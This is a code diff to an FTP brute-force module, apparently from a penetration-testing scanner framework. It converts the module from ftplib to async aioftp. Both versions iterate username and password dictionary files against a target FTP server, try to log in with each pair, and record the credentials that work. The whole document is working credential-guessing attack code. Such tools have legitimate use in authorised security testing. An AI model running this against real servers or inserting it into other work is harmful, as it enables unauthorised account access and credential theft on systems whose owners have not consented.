@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-import ftplib
+import aioftp
 from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
@@ -15,37 +15,24 @@ class POC(Script):
         self.level = 'high'
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        ftp = ftplib.FTP()
-        try:
-            ftp.connect(self.target_host, self.target_port, timeout=3)
-            ftp.quit()
-        except Exception as e:
-            return
-        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/ftp_usernames.txt')
-        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/ftp_passwords.txt')
+    async def prove(self):
         anonymous = False
         flag = 3
-        for linef1 in usernamedic:
-            username = linef1.strip('\r').strip('\n')
-            for linef2 in passworddic:
-                try:
-                    if username == 'anonymous':
-                        if anonymous:
-                            continue
-                        else:
-                            anonymous = True
-                    password = (
-                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
-                        '\r').strip('\n')
-                    ftp.connect(self.target_host, self.target_port,timeout=3)
-                    ftp.login(username, password)
+        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/ftp_usernames.txt')
+        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/ftp_passwords.txt')
+        async for (username, password) in self.generate_dict(usernamedic, passworddic):
+            try:
+                if username == 'anonymous':
+                    if anonymous:
+                        continue
+                    else:
+                        anonymous = True
+                async with aioftp.ClientSession(self.target_host, self.target_port, username, password) as client:
                     self.flag = 1
                     self.req.append({"username": username, "password": password})
-                    self.res.append({"info": username + "/" + password, "key": ftp.getwelcome()})
-                    ftp.quit()
-                except Exception as e:
-                    if "timed out" in str(e):
-                        if flag == 0:
-                            return
-                        flag -= 1
+                    self.res.append({"info": username + "/" + password, "key": "ftp burst"})
+            except Exception as e:
+                if "timed out" in str(e):
+                    if flag == 0:
+                        return
+                    flag -= 1
